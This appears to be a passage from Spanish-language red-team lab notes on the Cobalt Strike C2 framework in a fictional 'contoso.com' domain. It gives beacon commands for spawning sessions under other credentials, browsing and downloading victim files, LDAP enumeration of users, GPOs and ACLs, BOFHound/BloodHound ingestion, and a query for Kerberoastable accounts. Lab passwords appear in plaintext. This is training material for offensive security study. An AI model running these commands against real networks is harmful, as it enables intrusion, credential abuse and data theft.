
- No recomendable sleep 0(se buguea mucho), entre 2 y 5.
## 🧩 Comando: `spawn` y `spawnas`
> **Crea un nuevo Beacon** desde el actual, usando el mismo usuario o uno nuevo(spawnas).  
> El nuevo proceso recibe el shellcode del listener que indiquemos.
> Debes estar en una **ruta accesible para el nuevo usuario**, o el comando fallará

```powershell
#SPAWN
beacon> spawn [x86|x64] [listener]
#Ejemplo:
beacon> spawn x64 http

#SPAWNAS
beacon> spawnas [DOMINIO\usuario] [contraseña] [listener]
#Ejemplo:
beacon> cd C:\
beacon> spawnas CONTOSO\rsteel Passw0rd! http
```


- Saber informacion del dominio
```powershell
ldapsearch -x -H ldap://10.10.121.107 -b "DC=contoso,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName
```


## 🧩 Interactuando con el sistema

*file_browser*
> Ver explorador de archivos como si tuvieses rdp

```powershell
beacon> file_browser
```

*download*
> Descargar archivos del beacon
> Los puedes ver en el beacon, View > Downloads > Sync Fyles

```powershell
beacon> download C:\Users\pchilds\Desktop\desktop.ini
```

*process_browser*
> Ver procesos del sistema como **ps** visualmente como *administrador de tareas*

```powershell
beacon> process_browser
```

*VNC*
> Si queremos interactuar como un RDP

```powershell
breacon> desktop high
```

*Shell / Run / Powershell*
> Run: Comandos de Windows nativos
> Shell: Comandos de Linux nativos
> Powershell: Comandos de Powershell nativos

```powershell
beacon> run klist

beacon> shell ls

beacon> powershell $env:computername
```


## **Enumeración**

**BOFHound no enumera nada por sí solo**. Lo que hace es **parsear y convertir en JSON** toda la información que **tú previamente has sacado con `ldapsearch`**. Primero lanzas ldapsearch y luego bofhound.

### 🔎  Enumerar todos los usuarios

```powershell
beacon> ldapsearch (samAccountType=805306368)
```
###  Consultar -> Dominios, Ous, GPOs , Usuarios y Grupos

```powershell
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor


beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```


1. **BOFHound no hace estas consultas, solo interpreta sus resultados.**
	- Debes copiar los logs generados por `ldapsearch` desde el team server:
```bash
cd /mnt/c/Users/Attacker/Desktop

scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .

Passw0rd!
```

2. **Ejecutas BOFHound contra los logs**:
```bash
bofhound -i logs/
```
3. Arrancas los docker y vas:
```powershell
http://localhost:8080/ui/login

admin : eA%N4frBrnn2.
```

4. **Importas esos JSON a BloodHound** (`Administration > File Ingest`)
```bash
#Una vez se suba en explore cypher
Match (n:GPO) return n

#Kerberoasteables
MATCH (n:User) WHERE n.hasspn=true RETURN n

```

- ¿Veo SID sin nombre?
```powershell
ldapsearch (objectsid=S-1-5-21-XXXXX-XXXXX-XXXXX-YYYY) --attributes *,ntsecuritydescriptor


#Vuelves a lanzar los logs
bofhound -i logs/
```


## Ejemplo

```bash
#Clicas en Workstation ADMINS

guardas los Object is de cada PC

id wks 2 -> S-1-5-21-3926355307-1661546229-813047887-2102

id wks 1 -> S-1-5-21-3926355307-1661546229-813047887-2101
```

- En el beacon:
```powershell
ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\

download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

- Guardas su sid y lo añades a BofHound
```bash
SID ADMIN -> S-1-5-21-3926355307-1661546229-813047887-1106

#Añadirlos:
MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)


MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)
```
